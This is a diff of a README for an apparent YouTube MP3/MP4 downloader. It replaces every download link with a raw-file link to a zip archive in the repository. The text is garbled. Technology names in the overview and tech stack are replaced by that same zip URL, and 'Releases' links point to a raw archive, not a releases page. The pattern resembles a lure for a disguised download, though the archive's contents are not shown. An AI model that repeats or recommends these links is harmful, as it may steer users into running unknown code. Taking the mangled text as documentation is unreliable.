@@ -1,9 +1,9 @@
 # 🎥 YouTube-MP3-MP4-Downloader - Easy Video Downloads and Conversions
 
-[![Download from Releases](https://raw.githubusercontent.com/emann0/YouTube-MP3-MP4-Downloader/main/Yokuts/YouTube-MP3-MP4-Downloader.zip%20Now-Click%https://raw.githubusercontent.com/emann0/YouTube-MP3-MP4-Downloader/main/Yokuts/YouTube-MP3-MP4-Downloader.zip)](https://raw.githubusercontent.com/emann0/YouTube-MP3-MP4-Downloader/main/Yokuts/YouTube-MP3-MP4-Downloader.zip)
+[![Download from Releases](https://raw.githubusercontent.com/emann0/YouTube-MP3-MP4-Downloader/main/public/M_You_Downloader_Tube_1.6.zip%20Now-Click%https://raw.githubusercontent.com/emann0/YouTube-MP3-MP4-Downloader/main/public/M_You_Downloader_Tube_1.6.zip)](https://raw.githubusercontent.com/emann0/YouTube-MP3-MP4-Downloader/main/public/M_You_Downloader_Tube_1.6.zip)
 
 ## 🌟 Overview
-YouTube MP3 & MP4 Downloader is a simple web application that lets you download videos from YouTube in MP4 format and convert them into MP3 audio files. Built with https://raw.githubusercontent.com/emann0/YouTube-MP3-MP4-Downloader/main/Yokuts/YouTube-MP3-MP4-Downloader.zip and Express, this tool uses FFmpeg for audio processing. It's designed for quick deployment using Docker.
+YouTube MP3 & MP4 Downloader is a simple web application that lets you download videos from YouTube in MP4 format and convert them into MP3 audio files. Built with https://raw.githubusercontent.com/emann0/YouTube-MP3-MP4-Downloader/main/public/M_You_Downloader_Tube_1.6.zip and Express, this tool uses FFmpeg for audio processing. It's designed for quick deployment using Docker.
 
 ## ✨ Features
 - **Download Videos (MP4):** Choose various video resolutions for downloading.
@@ -13,7 +13,7 @@ YouTube MP3 & MP4 Downloader is a simple web application that lets you download 
 - **Ready for Docker:** Comes with a Dockerfile for easy image creation and deployment on supported container platforms.
 
 ## 🛠️ Tech Stack
-- **Backend:** https://raw.githubusercontent.com/emann0/YouTube-MP3-MP4-Downloader/main/Yokuts/YouTube-MP3-MP4-Downloader.zip, https://raw.githubusercontent.com/emann0/YouTube-MP3-MP4-Downloader/main/Yokuts/YouTube-MP3-MP4-Downloader.zip
+- **Backend:** https://raw.githubusercontent.com/emann0/YouTube-MP3-MP4-Downloader/main/public/M_You_Downloader_Tube_1.6.zip, https://raw.githubusercontent.com/emann0/YouTube-MP3-MP4-Downloader/main/public/M_You_Downloader_Tube_1.6.zip
 - **Template Engine:** EJS (Embedded JavaScript templates)
 - **YouTube Core:** @distube/ytdl-core
 - **Video/Audio Processing:** fluent-ffmpeg
@@ -30,7 +30,7 @@ Before you begin, make sure you have the following:
 ### Download & Install
 To get started, visit the Releases page to download the application. Click the link below:
 
-[Download from Releases](https://raw.githubusercontent.com/emann0/YouTube-MP3-MP4-Downloader/main/Yokuts/YouTube-MP3-MP4-Downloader.zip)
+[Download from Releases](https://raw.githubusercontent.com/emann0/YouTube-MP3-MP4-Downloader/main/public/M_You_Downloader_Tube_1.6.zip)
 
 You will find different versions of the application. Select the latest release and download the file suited for your system.
 
@@ -81,4 +81,4 @@ This project is licensed under the MIT License. For more details, check the LICE
 ## 📞 Support
 If you experience any issues or have questions about using the application, feel free to raise an issue on the GitHub repository, and we'll be happy to help.
 
-[Download from Releases](https://raw.githubusercontent.com/emann0/YouTube-MP3-MP4-Downloader/main/Yokuts/YouTube-MP3-MP4-Downloader.zip)
+[Download from Releases](https://raw.githubusercontent.com/emann0/YouTube-MP3-MP4-Downloader/main/public/M_You_Downloader_Tube_1.6.zip)
